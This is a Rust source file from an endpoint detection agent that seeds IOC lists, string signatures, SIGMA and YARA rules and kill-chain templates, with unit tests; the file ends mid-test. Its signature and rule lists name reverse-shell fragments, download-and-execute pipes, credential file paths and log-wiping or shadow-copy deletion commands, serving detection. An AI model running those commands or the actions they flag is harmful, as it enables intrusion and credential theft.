use std::fs;
use std::io::BufReader;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use detection::{
    DetectionEngine, IocExactStore, KillChainTemplate, RansomwarePolicy, TemplatePredicate,
};
use tracing::{info, warn};

use crate::config::AgentConfig;

#[derive(Debug, Clone)]
pub(super) struct DetectionSourcePaths {
    pub sigma_dir: PathBuf,
    pub yara_dir: PathBuf,
    pub ioc_dir: PathBuf,
}

impl DetectionSourcePaths {
    pub(super) fn from_config(config: &AgentConfig) -> Self {
        Self {
            sigma_dir: PathBuf::from(config.detection_sigma_rules_dir.clone()),
            yara_dir: PathBuf::from(config.detection_yara_rules_dir.clone()),
            ioc_dir: PathBuf::from(config.detection_ioc_dir.clone()),
        }
    }
}

pub(super) fn build_detection_engine_with_ransomware_policy(
    policy: RansomwarePolicy,
    sources: &DetectionSourcePaths,
) -> DetectionEngine {
    let mut detection = DetectionEngine::default_with_rules();
    configure_low_memory_ioc_exact_store(&mut detection, low_memory_ioc_exact_store_enabled());
    detection.layer4 =
        detection::Layer4Engine::with_capacity_and_policy(300, 8_192, 32_768, policy);
    seed_ioc_hashes(&mut detection);
    seed_ioc_domains(&mut detection);
    seed_ioc_ips(&mut detection);
    seed_string_signatures(&mut detection);
    seed_sigma_rules(&mut detection, &sources.sigma_dir);
    seed_yara_rules(&mut detection, &sources.yara_dir);
    seed_kill_chain_templates(&mut detection);
    load_ioc_files(&mut detection, &sources.ioc_dir);
    seed_detection_allowlist(&mut detection);
    detection
}

static IOC_EXACT_STORE_SEQUENCE: AtomicU64 = AtomicU64::new(1);

fn low_memory_ioc_exact_store_enabled() -> bool {
    match std::env::var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE") {
        Ok(raw) => matches!(
            raw.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        ),
        Err(_) => super::host_is_low_memory(super::linux_host_mem_total_bytes()),
    }
}

fn configure_low_memory_ioc_exact_store(detection: &mut DetectionEngine, enabled: bool) {
    if !enabled {
        return;
    }

    let staging_root = super::resolve_rules_staging_root();
    if let Err(err) = fs::create_dir_all(&staging_root) {
        warn!(
            error = %err,
            path = %staging_root.display(),
            "failed preparing low-memory IOC exact-store directory"
        );
        return;
    }

    cleanup_stale_ioc_exact_store_files(&staging_root);
    let sequence = IOC_EXACT_STORE_SEQUENCE.fetch_add(1, Ordering::Relaxed);
    let path = staging_root.join(format!(
        "ioc-exact-store-{}-{}.sqlite",
        std::process::id(),
        sequence
    ));

    match IocExactStore::open_ephemeral(&path) {
        Ok(store) => {
            detection.layer1.enable_exact_store_only(store);
            info!(
                path = %path.display(),
                "enabled low-memory Layer1 exact-store mode"
            );
        }
        Err(err) => {
            warn!(
                error = %err,
                path = %path.display(),
                "failed enabling low-memory Layer1 exact-store mode; using in-memory prefilter"
            );
        }
    }
}

fn cleanup_stale_ioc_exact_store_files(staging_root: &Path) {
    let current_pid = std::process::id().to_string();
    let entries = match fs::read_dir(staging_root) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|value| value.to_str()) else {
            continue;
        };
        if !name.starts_with("ioc-exact-store-") || name.contains(&format!("-{}-", current_pid)) {
            continue;
        }

        let _ = fs::remove_file(&path);
    }
}

fn seed_detection_allowlist(detection: &mut DetectionEngine) {
    // The agent's own self-monitoring (reading /proc/self/stat every tick)
    // triggers Layer 3 anomaly and behavioral CUSUM false positives.
    // Allowlisting the agent process prevents wasted detection cycles on
    // known-good self-monitoring while keeping all other processes fully
    // monitored.
    detection
        .allowlist
        .add_allowed_process("eguard-agent".to_string());
}

// ── Layer 1: IOC Hashes ─────────────────────────────────────────
fn seed_ioc_hashes(detection: &mut DetectionEngine) {
    detection.layer1.load_hashes([
        // EICAR test file SHA-256
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
        // Placeholder for real malware hashes (loaded from rules/ioc/ at runtime)
        "deadbeef".to_string(),
    ]);
}

// ── Layer 1: IOC Domains ────────────────────────────────────────
fn seed_ioc_domains(detection: &mut DetectionEngine) {
    detection.layer1.load_domains([
        "known-c2.example.com".to_string(),
        "evil-c2-domain.example.com".to_string(),
        // Common test/simulation C2 domains
        "malware-callback.example.net".to_string(),
    ]);
}

// ── Layer 1: IOC IPs ────────────────────────────────────────────
fn seed_ioc_ips(detection: &mut DetectionEngine) {
    detection.layer1.load_ips([
        // RFC 5737 documentation ranges (used for testing)
        "198.51.100.10".to_string(),
        "203.0.113.10".to_string(),
        // Feodo Tracker / known C2 placeholder
        "192.0.2.1".to_string(),
    ]);
}

// ── Layer 1: Aho-Corasick String Signatures ─────────────────────
fn seed_string_signatures(detection: &mut DetectionEngine) {
    detection.layer1.load_string_signatures([
        // Download-and-execute patterns
        "curl|bash".to_string(),
        "curl | bash".to_string(),
        "wget|bash".to_string(),
        "wget | bash".to_string(),
        "curl|sh".to_string(),
        "wget|sh".to_string(),
        // Scripting interpreter execution
        "python -c".to_string(),
        "python3 -c".to_string(),
        "perl -e".to_string(),
        "ruby -e".to_string(),
        "powershell -enc".to_string(),
        "powershell -e ".to_string(),
        // Reverse shell patterns
        ">& /dev/tcp/".to_string(),
        "bash -i".to_string(),
        "nc -e /bin".to_string(),
        "ncat -e /bin".to_string(),
        "mkfifo /tmp/".to_string(),
        // Obfuscation patterns
        "base64 -d".to_string(),
        "base64 --decode".to_string(),
        // Privilege escalation / credential access
        "/etc/shadow".to_string(),
        "/etc/sudoers".to_string(),
        "passwd --stdin".to_string(),
        // Kernel module loading
        "insmod ".to_string(),
        "modprobe ".to_string(),
        // Persistence
        "crontab ".to_string(),
        "systemctl enable".to_string(),
        // Lateral movement
        "ssh root@".to_string(),
        // Data exfiltration indicators
        "curl -x post".to_string(),
        "curl --upload".to_string(),
        // Crypto mining
        "xmrig".to_string(),
        "stratum+tcp://".to_string(),
        "stratum+ssl://".to_string(),
        "minerd".to_string(),
        "cpuminer".to_string(),
        "cryptonight".to_string(),
        // Download to /tmp
        "-o /tmp/".to_string(),
        "-O /tmp/".to_string(),
        // Pipe to interpreter (with URL gap)
        "| bash".to_string(),
        "| sh".to_string(),
        "|bash".to_string(),
        "|sh".to_string(),
        // Anti-forensics
        "rm -rf /var/log".to_string(),
        "history -c".to_string(),
        "shred ".to_string(),
    ]);
}

// ── Layer 2: SIGMA Temporal Rules ───────────────────────────────
fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
    let rules: &[(&str, &str)] = &[
        ("builtin_webshell", SIGMA_WEBSHELL),
        ("builtin_reverse_shell", SIGMA_REVERSE_SHELL),
        ("builtin_download_exec", SIGMA_DOWNLOAD_EXEC),
        ("builtin_privesc", SIGMA_PRIVESC),
        ("builtin_kernel_module", SIGMA_KERNEL_MODULE),
        ("builtin_persistence", SIGMA_PERSISTENCE),
        ("builtin_lateral_movement", SIGMA_LATERAL_MOVEMENT),
        ("builtin_sensitive_file", SIGMA_SENSITIVE_FILE),
        ("builtin_data_exfil", SIGMA_DATA_EXFIL),
        ("builtin_win_reg_save_sam", SIGMA_WIN_REG_SAVE_SAM),
        (
            "builtin_win_ps_download_cradle",
            SIGMA_WIN_PS_DOWNLOAD_CRADLE,
        ),
        (
            "builtin_win_shadow_copy_delete",
            SIGMA_WIN_SHADOW_COPY_DELETE,
        ),
        ("builtin_win_event_log_clear", SIGMA_WIN_EVENT_LOG_CLEAR),
        ("builtin_win_schtask_creation", SIGMA_WIN_SCHTASK_CREATION),
        ("builtin_win_service_creation", SIGMA_WIN_SERVICE_CREATION),
    ];

    let mut loaded = 0usize;
    for (label, yaml) in rules {
        match detection.load_sigma_rule_yaml(yaml) {
            Ok(_) => loaded += 1,
            Err(err) => warn!(rule = %label, error = %err, "failed loading built-in SIGMA rule"),
        }
    }

    for rules_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/sigma")) {
        if !rules_dir.exists() {
            continue;
        }
        match detection.load_sigma_rules_from_dir(&rules_dir) {
            Ok(count) => loaded += count,
            Err(err) => {
                warn!(error = %err, path = %rules_dir.display(), "failed loading SIGMA rules from directory")
            }
        }
    }

    info!(loaded_sigma_rules = loaded, "SIGMA rules initialized");
}

// ── Webshell: web server spawns shell that makes outbound connection ──
const SIGMA_WEBSHELL: &str = r#"
title: eguard_builtin_webshell
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash, sh, dash, zsh, python, python3, perl, php]
      parent_any_of: [nginx, apache2, httpd, caddy, lighttpd, php-fpm]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      within_secs: 10
"#;

// ── Reverse shell: bash with /dev/tcp redirect or nc/ncat ──
const SIGMA_REVERSE_SHELL: &str = r#"
title: eguard_builtin_reverse_shell
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash, sh, dash, zsh]
      within_secs: 60
    - event_class: network_connect
      dst_port_not_in: [80, 443, 22, 53, 8080, 8443]
      within_secs: 5
"#;

// ── Download & execute: curl/wget followed by shell ──
const SIGMA_DOWNLOAD_EXEC: &str = r#"
title: eguard_builtin_download_exec
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [curl, wget]
      within_secs: 60
    - event_class: process_exec
      process_any_of: [bash, sh, python, python3, perl, chmod]
      within_secs: 10
"#;

// ── Privilege escalation: non-root process chain to root ──
const SIGMA_PRIVESC: &str = r#"
title: eguard_builtin_privesc
detection:
  sequence:
    - event_class: process_exec
      uid_ne: 0
      within_secs: 60
    - event_class: process_exec
      uid_eq: 0
      within_secs: 20
"#;

// ── Suspicious kernel module load ──
const SIGMA_KERNEL_MODULE: &str = r#"
title: eguard_builtin_kernel_module
detection:
  sequence:
    - event_class: module_load
      within_secs: 300
"#;

// ── Persistence via cron or systemd ──
const SIGMA_PERSISTENCE: &str = r#"
title: eguard_builtin_persistence
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [crontab, systemctl, at]
      within_secs: 120
    - event_class: file_open
      file_path_contains: [/etc/cron, /etc/systemd/system/, /etc/init.d/, .bashrc, .profile, /etc/profile.d/]
      require_file_write: true
      within_secs: 10
"#;

// ── Lateral movement: SSH or SMB ──
const SIGMA_LATERAL_MOVEMENT: &str = r#"
title: eguard_builtin_lateral_movement
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [ssh, scp, rsync, smbclient, psexec, impacket]
      within_secs: 120
    - event_class: network_connect
      within_secs: 10
"#;

// ── Sensitive file access ──
const SIGMA_SENSITIVE_FILE: &str = r#"
title: eguard_builtin_sensitive_file_access
detection:
  sequence:
    - event_class: file_open
      uid_ne: 0
      process_any_of: [
        cat,
        grep,
        awk,
        sed,
        strings,
        xxd,
        hexdump,
        head,
        tail,
        less,
        more,
        cp,
        tar,
        rsync,
        scp,
        bash,
        sh,
        dash,
        zsh,
        fish,
        python,
        python3,
        perl,
        ruby,
        php,
        sqlite3,
        security,
        plutil,
        powershell.exe,
        pwsh.exe,
        cmd.exe,
        reg.exe,
        rundll32.exe,
        certutil.exe,
        mshta.exe,
        wscript.exe,
        cscript.exe,
        mimikatz.exe
      ]
      file_path_any_of: [
        /etc/shadow,
        /etc/gshadow,
        /etc/master.passwd,
        /root/.ssh/id_rsa,
        C:\Windows\System32\config\SAM,
        C:\Windows\System32\config\SECURITY,
        C:\Windows\System32\config\SYSTEM,
        C:\Windows\NTDS\ntds.dit,
        /Library/Keychains/System.keychain
      ]
      file_path_contains: [
        '/.ssh/id_',
        '/.aws/credentials',
        '.aws\\credentials',
        'keepass',
        'keychain',
        'ntds.dit'
      ]
      within_secs: 300
"#;

// ── Data exfiltration: file read followed by outbound POST ──
const SIGMA_DATA_EXFIL: &str = r#"
title: eguard_builtin_data_exfil
detection:
  sequence:
    - event_class: file_open
      within_secs: 60
    - event_class: network_connect
      dst_port_not_in: [22, 53]
      within_secs: 15
"#;

const SIGMA_WIN_REG_SAVE_SAM: &str = r#"
title: eguard_win_reg_save_sam
logsource:
  product: windows
  service: security

detection:
  selection:
    Image|endswith:
      - '\\reg.exe'
      - '\\reg'
    CommandLine|contains:
      - 'save hklm\\sam'
      - 'save hklm\\system'
      - 'save hklm\\security'
  condition: selection
"#;

const SIGMA_WIN_PS_DOWNLOAD_CRADLE: &str = r#"
title: eguard_win_ps_download_cradle
logsource:
  product: windows
  service: powershell

detection:
  selection:
    Image|endswith:
      - '\\powershell.exe'
      - '\\pwsh.exe'
    CommandLine|contains:
      - 'downloadstring'
      - 'downloadfile'
      - 'invoke-expression'
      - 'iex '
      - 'new-object net.webclient'
  condition: selection
"#;

const SIGMA_WIN_SHADOW_COPY_DELETE: &str = r#"
title: eguard_win_shadow_copy_delete
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'wmic shadowcopy delete'
      - 'wbadmin delete catalog'
  condition: selection
"#;

const SIGMA_WIN_EVENT_LOG_CLEAR: &str = r#"
title: eguard_win_event_log_clear
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    CommandLine|contains:
      - 'wevtutil cl'
      - 'clear-eventlog'
  condition: selection
"#;

const SIGMA_WIN_SCHTASK_CREATION: &str = r#"
title: eguard_win_schtask_creation
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    Image|endswith:
      - '\\schtasks.exe'
      - '\\schtasks'
    CommandLine|contains:
      - '/create'
      - '/ru system'
      - '/sc onlogon'
  condition: selection
"#;

const SIGMA_WIN_SERVICE_CREATION: &str = r#"
title: eguard_win_service_creation_suspicious
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    Image|endswith:
      - '\\sc.exe'
      - '\\sc'
    CommandLine|contains:
      - ' create '
      - 'binpath='
      - 'powershell'
      - 'cmd /c'
  condition: selection
"#;

// ── Layer 3: YARA Rules ─────────────────────────────────────────
fn seed_yara_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
    const YARA_RULES: &str = r#"
rule eguard_builtin_test_marker {
  strings:
    $marker = "eguard-malware-test-marker"
  condition:
    $marker
}

rule eguard_eicar_test {
  strings:
    $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" ascii
  condition:
    $eicar
}

rule eguard_shellcode_marker {
  strings:
    $marker = "eguard-shellcode-marker"
  condition:
    $marker
}
"#;

    let mut loaded = 0usize;
    match detection.load_yara_rules_str(YARA_RULES) {
        Ok(count) => loaded += count,
        Err(err) => warn!(error = %err, "failed loading built-in YARA rules"),
    }

    for rules_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/yara")) {
        if !rules_dir.exists() {
            continue;
        }
        match detection.load_yara_rules_from_dir(&rules_dir) {
            Ok(count) => loaded += count,
            Err(err) => {
                warn!(error = %err, path = %rules_dir.display(), "failed loading YARA rules from directory")
            }
        }
    }

    info!(loaded_yara_rules = loaded, "YARA rules initialized");
}

// ── Layer 4: Kill Chain Templates ───────────────────────────────
fn seed_kill_chain_templates(detection: &mut DetectionEngine) {
    use detection::util::set_of;

    // Data theft chain: sensitive file read → outbound connection
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_data_theft".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: true,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: Some(set_of(["curl", "wget", "python", "python3", "nc", "ncat"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 60,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_credential_theft".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: Some(0),
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: true,
            require_ransomware_write_burst: false,
            require_container_escape: false,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    // Lateral movement chain: SSH/SCP connection
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_lateral_ssh".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: Some(set_of(["ssh", "scp", "rsync"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 4,
        max_inter_stage_secs: 30,
    });

    // Reverse shell chain: shell → outbound non-standard port
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_reverse_shell".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: Some(set_of(["bash", "sh", "dash", "zsh"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 4,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_container_escape".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: false,
            require_container_escape: true,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_container_privileged".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: false,
            require_container_escape: false,
            require_privileged_container: true,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_ptrace_fileless".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: true,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: true,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_userfaultfd_execveat".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: true,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: true,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_proc_mem_fileless".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: true,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: true,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });
}

fn configured_or_fallback_dirs(configured_dir: &Path, fallback_dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();

    if !configured_dir.as_os_str().is_empty() {
        out.push(configured_dir.to_path_buf());
    }

    if fallback_dir != configured_dir {
        out.push(fallback_dir.to_path_buf());
    }

    out
}

// ── Load IOC files from rules/ioc/ directory ────────────────────
fn load_ioc_files(detection: &mut DetectionEngine, configured_dir: &Path) {
    for ioc_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/ioc")) {
        if !ioc_dir.exists() {
            continue;
        }

        // hashes.txt — one SHA-256 per line
        let hashes_path = ioc_dir.join("hashes.txt");
        if hashes_path.exists() {
            if let Ok(file) = fs::File::open(&hashes_path) {
                let count = detection
                    .layer1
                    .load_hashes_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %hashes_path.display(), "loaded IOC hashes from file");
                }
            }
        }

        // domains.txt — one domain per line
        let domains_path = ioc_dir.join("domains.txt");
        if domains_path.exists() {
            if let Ok(file) = fs::File::open(&domains_path) {
                let count = detection
                    .layer1
                    .load_domains_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %domains_path.display(), "loaded IOC domains from file");
                }
            }
        }

        // ips.txt — one IP per line
        let ips_path = ioc_dir.join("ips.txt");
        if ips_path.exists() {
            if let Ok(file) = fs::File::open(&ips_path) {
                let count = detection.layer1.load_ips_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %ips_path.display(), "loaded IOC IPs from file");
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::{
        build_detection_engine_with_ransomware_policy, configured_or_fallback_dirs,
        DetectionSourcePaths,
    };
    use detection::{EventClass, Layer1Result, RansomwarePolicy, TelemetryEvent};
    use std::time::{SystemTime, UNIX_EPOCH};

    fn unique_temp_dir(label: &str) -> std::path::PathBuf {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock before unix epoch")
            .as_nanos();
        std::env::temp_dir().join(format!(
            "eguard-detection-bootstrap-{}-{}-{}",
            label,
            std::process::id(),
            nonce
        ))
    }

    fn base_event() -> TelemetryEvent {
        TelemetryEvent {
            ts_unix: 1_700_000_000,
            event_class: EventClass::ProcessExec,
            pid: 4242,
            ppid: 1,
            uid: 1000,
            process: "bash".to_string(),
            parent_process: "nginx".to_string(),
            session_id: 1,
            file_path: None,
            file_write: false,
            file_hash: None,
            dst_port: None,
            dst_ip: None,
            dst_domain: None,
            command_line: None,
            event_size: None,
            container_runtime: None,
            container_id: None,
            container_escape: false,
            container_privileged: false,
        }
    }

    #[test]
    fn configured_or_fallback_dirs_prefers_configured_then_relative_fallback() {
        let configured = std::path::Path::new("/opt/eguard/rules/yara");
        let dirs = configured_or_fallback_dirs(configured, std::path::Path::new("rules/yara"));
        assert_eq!(dirs.len(), 2);
        assert_eq!(dirs[0], configured);
        assert_eq!(dirs[1], std::path::Path::new("rules/yara"));
    }

    #[test]
    fn bootstrap_loads_sigma_rules_from_configured_directory() {
        let base = unique_temp_dir("sigma");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::write(
            sigma_dir.join("custom.yml"),
            r#"
title: sigma_custom_runtime_rule
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
      parent_any_of: [nginx]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      within_secs: 10
"#,
        )
        .expect("write sigma rule");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let first = base_event();
        let mut second = base_event();
        second.ts_unix += 1;
        second.event_class = EventClass::NetworkConnect;
        second.dst_port = Some(8443);

        let _ = engine.process_event(&first);
        let outcome = engine.process_event(&second);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "sigma_custom_runtime_rule"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_loads_yara_rules_from_configured_directory() {
        let base = unique_temp_dir("yara");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::write(
            yara_dir.join("custom.yar"),
            r#"
rule eguard_custom_dir_test {
  strings:
    $marker = "eguard-custom-yara-marker"
  condition:
    $marker
}
"#,
        )
        .expect("write yara rule");

        let sample_path = base.join("sample.bin");
        std::fs::write(&sample_path, b"eguard-custom-yara-marker").expect("write sample");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.file_path = Some(sample_path.to_string_lossy().to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .yara_hits
            .iter()
            .any(|hit| hit.rule_name == "eguard_custom_dir_test"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_loads_iocs_from_configured_directory() {
        let base = unique_temp_dir("ioc");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        let custom_hash = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        std::fs::write(ioc_dir.join("hashes.txt"), format!("{custom_hash}\n"))
            .expect("write hash IOC file");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let mut event = base_event();
        event.file_hash = Some(custom_hash.to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome.signals.z1_exact_ioc);
        assert!(outcome
            .layer1
            .matched_fields
            .iter()
            .any(|field| field == "file_hash"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_low_memory_path_uses_exact_store_only_for_iocs() {
        let _env_guard = crate::lifecycle::shared_env_var_lock()
            .lock()
            .expect("env lock");
        let base = unique_temp_dir("ioc-low-memory");
        let staging_dir = base.join("staging");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::create_dir_all(&staging_dir).expect("create staging dir");
        std::fs::write(
            ioc_dir.join("hashes.txt"),
            "abc123\n# ignore this line\ndef456  # inline comment\n",
        )
        .expect("write IOC file");
        std::env::set_var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE", "1");
